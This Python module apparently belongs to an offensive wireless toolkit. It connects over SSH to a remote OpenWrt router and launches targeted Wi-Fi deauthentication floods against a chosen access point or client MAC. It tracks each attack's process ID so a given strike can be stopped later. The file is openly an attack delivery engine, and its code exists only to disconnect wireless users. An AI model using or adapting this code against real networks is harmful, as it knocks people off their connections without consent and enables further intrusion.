#!/usr/bin/env python3
"""
File Name: strike_smart_fire.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_smart_fire.py
Created Date: 2026-05-25
Version: 1.0.5
Description: Remote OpenWrt Targeted Deauthentication Exploit Delivery Engine.
             Optimized via centralized shared utility toolkits wrappers.
"""

import time
import threading

from core.system_guard import SystemGuard
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from utils.shared_utils_1 import SharedSecurityToolkit
from utils.shared_utils_2 import SharedHardwarePulseVerifier


class StrikeSmartFireEngine:
    """
    Main Remote Exploit Delivery Component.
    Leverages central utility shards to validate and stream tactical injections.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك الحراسة والضرب الموجه وتأمين صلاحيات النظام محلياً"""
        SystemGuard.enforce_root_privileges("Strike Smart Fire Remote Engine")
        self.ssh_factory = OpWrtSSHFactory(ip=ap_ip, password=ap_password)
        self.lock = threading.Lock()

        # قاموس تتبع وحراسة الـ PIDs للأهداف داخل الراوتر البعيد
        self.active_remote_strikes = {}

    def launch_targeted_deauth_storm_safe(
        self, mon_iface: str, target_bssid: str, client_mac: str = None
    ) -> bool:
        """ضخ وإطلاق عاصفة قذف حزم الفصل الموجهة بالاعتماد على الحقائب المشتركة"""
        clean_mon = SharedSecurityToolkit.sanitize_input(mon_iface, "interface")
        clean_target = SharedSecurityToolkit.sanitize_input(target_bssid, "bssid").upper()

        if not clean_mon or not clean_target:
            print("[-] Configuration Error: Invalid interface or target bounds.")
            return False

        with self.lock:
            if clean_target in self.active_remote_strikes:
                print(f"[-] Alert: Node [{clean_target}] is already active.")
                return False

        # تفتيت وكسر أسطر صياغة وتلقيم المقذوف الشبكي للتوافق مع معيار الـ 100 حرف لـ Pylint
        gen_sh = SharedHardwarePulseVerifier.generate_sequential_attack_sh
        if client_mac:
            clean_client = SharedSecurityToolkit.sanitize_input(client_mac, "bssid").upper()
            attack_cmd = f"{gen_sh(clean_target, clean_mon)} -c {clean_client}"
        else:
            attack_cmd = gen_sh(clean_target, clean_mon)

        try:
            print(f"[*] [Smart Fire] Dispatching payload against: {clean_target}")

            # هندسة الـ PID الحقيقي المتولد دون تخمين عبر دمج التلقيم وقراءته فوراً بـ echo $!
            combined_cmd = f"nohup {attack_cmd} > /dev/null 2>&1 & echo $!"
            raw_pid_out = self.ssh_factory.execute_remote_cmd(combined_cmd)

            time.sleep(1)

            # التحقق الصارم من متانة المعرّف العائد من شل الراوتر البعيد
            if raw_pid_out and raw_pid_out.strip().isdigit():
                current_pid = raw_pid_out.strip()
                with self.lock:
                    self.active_remote_strikes[clean_target] = current_pid
                print(f"[+] Smart Fire Active🎯! Internal PID: {current_pid}")
                return True

            print("[-] Hardware Exception: Target core rejected exploit process spawn.")
            return False

        except (ValueError, KeyError, AttributeError, SystemError) as e:
            print(f"[-] Integrity Error: Exception inside pipeline context: {e}")
            return False

    def abort_specific_target_strike(self, target_bssid: str) -> bool:
        """كبح وإخماد الضربة الموجهة للهدف المحدد بالملي بالـ PID الداخلي"""
        clean_mac = SharedSecurityToolkit.sanitize_input(target_bssid, "bssid").upper()

        with self.lock:
            target_pid = self.active_remote_strikes.get(clean_mac)
            if not target_pid:
                print(f"[-] Notice: No active channels for target: {clean_mac}")
                return False

        print(f"[*] [UCI Kinetics] Sending kill to PID descriptor: {target_pid}")
        self.ssh_factory.execute_remote_cmd(f"kill -9 {target_pid}")

        with self.lock:
            if clean_mac in self.active_remote_strikes:
                del self.active_remote_strikes[clean_mac]

        print(f"[+] Successfully decoupled exploit handles for asset: [{clean_mac}]")
        return True


if __name__ == "__main__":
    print("[+] Strike Smart Fire Engine module configuration verified.")
